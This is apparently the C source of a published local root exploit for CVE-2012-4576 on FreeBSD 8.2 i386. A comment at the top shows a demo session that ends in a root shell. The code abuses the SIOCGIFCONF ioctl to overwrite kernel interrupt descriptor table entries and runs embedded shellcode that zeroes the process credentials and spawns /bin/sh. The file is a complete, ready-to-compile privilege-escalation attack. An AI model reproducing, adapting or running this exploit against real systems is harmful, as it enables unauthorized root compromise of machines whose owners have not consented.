/*
andersonc0d3@0v3rl4bs:~/CVE-2012-4576-linux$ uname -a
Linux 0v3rl4bs 3.2.0-35-generic-pae #55-Ubuntu SMP Wed Dec 5 18:04:39 UTC 2012 i686 i686 i386 GNU/Linux
andersonc0d3@0v3rl4bs:~/CVE-2012-4576-linux$ ls
CVE-2012-4576-linux.c  README  structs.h
andersonc0d3@0v3rl4bs:~/CVE-2012-4576-linux$ gcc CVE-2012-4576-linux.c -o CVE-2012-4576-linux
andersonc0d3@0v3rl4bs:~/CVE-2012-4576-linux$ sftp andersonc0d3@192.168.127.134
Password:
Connected to 192.168.127.134.
sftp> put CVE-2012-4576-linux /home/andersonc0d3/
Uploading CVE-2012-4576-linux to /home/andersonc0d3/CVE-2012-4576-linux
CVE-2012-4576-linux                                                                                                                                                        100%   12KB  12.2KB/s   00:00    
sftp> quit
andersonc0d3@0v3rl4bs:~/CVE-2012-4576-linux$ ssh andersonc0d3@192.168.127.134
Password:
Last login: Tue Jan  1 17:33:39 2013 from 192.168.127.1
Copyright (c) 1980, 1983, 1986, 1988, 1990, 1991, 1993, 1994
...
$ id
uid=1001(andersonc0d3) gid=1001(andersonc0d3) groups=1001(andersonc0d3),0(wheel)
$ uname -a
FreeBSD freebsd8.2_x86 8.2-RELEASE FreeBSD 8.2-RELEASE #0: Fri Feb 18 02:24:46 UTC 2011     root@almeida.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  i386
$ ./CVE-2012-4576-linux
[*] kernelfile: /boot/kernel.old/kernel
[*] Xpage: 0xc0bcbe5c
[*] Xrsvd: 0xc0bcbe70
[*] Xfpu: 0xc0bcbe7c
[*] Xalign: 0xc0bcbe88
[*] Xmchk: 0xc0bcbe64
[*] Xxmm: 0xc0bcbe90
[*] done!
# id
uid=0(root) gid=0(wheel) egid=1001(andersonc0d3) groups=1001(andersonc0d3),0(wheel)
# 

Written by Anderson Nascimento < andersonc0d3@gmail.com >
Tested on FreeBSD 8.2 RELEASE i386
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <net/if.h>

#include "structs.h"

#define ADDR_HIGH 0x74650000

void *functions[6];

char *symbols[] = {"Xpage","Xrsvd","Xfpu","Xalign","Xmchk","Xxmm",NULL};
void *idt_xpage_entry;
char kernelfile[40];

unsigned char trampoline_code[] = "\xb8\x44\x43\x42\x41"// mov $0x41424344,%eax
                                  "\xff\xe0";		// jmp *%eax

unsigned char retuser[] = "\xb8\x08\x00\x00\x00"       	// mov $0x8,%eax
			  "\x8e\xe0"                    // mov %eax,%fs
			  "\x64\xa1\x00\x00\x00\x00"    // mov %fs:0x0,%eax
			  "\x8b\x40\x04"             	// mov 0x4(%eax),%eax
   			  "\x8b\x40\x24"             	// mov 0x24(%eax),%eax	
			  "\xc7\x40\x04\x00\x00\x00\x00"// movl $0x0,0x4(%eax)
			  "\xc7\x40\x08\x00\x00\x00\x00"// movl $0x0,0x8(%eax)
			  "\x6a\x3b"		  	// push $0x3b
			  "\x6a\x3b"		  	// push $0x3b
			  "\x6a\x3b"		  	// push $0x3b
			  "\x0f\xa1"		  	// pop %fs
			  "\x07"		  	// pop %es
			  "\x1f"		  	// pop %ds
			  "\x6a\x3b"		  	// push $0x3b 		#ss
			  "\x68\x60\xeb\xbf\xbf"  	// push $0xbfbfeb60	#esp
			  "\x68\x46\x02\x00\x00" 	// push $0x246 		#eflags
			  "\x6a\x33"		  	// push $0x33 		#cs
			  "\x68\x11\x22\x33\x44"  	// push $0x44332211     #eip
			  "\xcf";		  	// iret

unsigned long get_kernel_name(void){
	char shit[40];
	FILE *f;
	int ret;
	
	f = popen("sysctl kern.bootfile","r");
	ret = fscanf(f,"%s %s",shit,kernelfile);
	pclose(f);
	if(ret != 2)
		return -1;	
return 0;
}

void *get_sym(char *name){
	FILE *f;
	void *addr;
	char shit;
	char symbol[50];
	char command[512];
	int ret;

	memset(symbol,'\0',sizeof(symbol));
	memset(command,'\0',sizeof(command));

	sprintf(command, "nm %s|grep -w \"%s\"",kernelfile,name);

	f = popen(command, "r");

	ret = fscanf(f, "%p %c %s", &addr, &shit, symbol);
        pclose(f);

	if(ret != 3)
		return NULL;

	if (!strcmp(name, symbol)){
		return addr;
	}

return NULL;
}

void kernel_code(void){
	void (*func)(void);
	int i,entry;
	
	entry = 14;

	for(i = 0; functions[i] != NULL; i++){
	        setidt(entry++, functions[i], SDT_SYS386IGT, SEL_KPL,GSEL(GCODE_SEL, SEL_KPL));
	}

	for(i = 0; i < 5; i++){
	        setidt(entry++, functions[1], SDT_SYS386IGT, SEL_KPL,GSEL(GCODE_SEL, SEL_KPL));
	}

	func = (void *)retuser;
	func();
}

void done(void){
	if(getuid() == 0){
		fprintf(stdout,"[*] done!\n");
		execl("/bin/sh", "sh", NULL);
	}
	else{
		fprintf(stderr,"[*] failed!\n");
	}

	exit(EXIT_SUCCESS);
}


//Taken from http://www.techpulp.com/blog/2008/10/get-list-of-interfaces-using-siocgifconf-ioctl/

int get_iface_list(struct ifconf *ifconf){
   int sock, rval;

   sock = socket(AF_INET,SOCK_STREAM,0);
   if(sock < 0)
   {
     perror("socket");
     return (-1);
   }

   if((rval = ioctl(sock, SIOCGIFCONF , (char*) ifconf  )) < 0 ) //Triggering the bug
     perror("ioctl(SIOGIFCONF)");

return 0;
}

int main(void){
	int i;
	static struct ifreq ifreqs[20];
	struct ifconf ifconf;
	void *addr,*addr2;

	addr = done;
	memcpy(retuser+sizeof(retuser)-6,&addr,4);

	if(get_kernel_name() != 0){
		fprintf(stderr,"[!] failed to get kernel filename\n");
		exit(EXIT_FAILURE);
	}	

	fprintf(stdout,"[*] kernelfile: %s\n",kernelfile);

        if((idt = (struct gate_descriptor *)get_sym("idt0")) == NULL){
		fprintf(stderr,"[!] failed to resolve: idt0\n");
		exit(EXIT_FAILURE);
	}

        idt_xpage_entry = (char *)idt+118;
	
	for(i = 0; symbols[i] != NULL ; i++){
		if((functions[i] = get_sym(symbols[i])) == NULL){
			fprintf(stderr,"[!] failed to resolve: %s\n",symbols[i]);
			exit(EXIT_FAILURE);
		}
		else{
			fprintf(stdout,"[*] %s: %p\n",symbols[i],functions[i]);
		}
	}

	addr = kernel_code;

	memcpy(trampoline_code+1,&addr,4);

	addr = (void *)(ADDR_HIGH | ((int)functions[0] & 0xffff));
	addr2 = (void *)((int)addr & ~(4096-1));

        if(mmap(addr2, 4096, PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED) {
                perror("mmap");
                exit(EXIT_FAILURE);
        }

	memcpy((void *)addr,trampoline_code,sizeof(trampoline_code));

	memset(&ifconf,0,sizeof(ifconf));

	ifconf.ifc_buf = idt_xpage_entry;
	ifconf.ifc_len = sizeof(ifreqs);
	get_iface_list(&ifconf);

return 0;
}
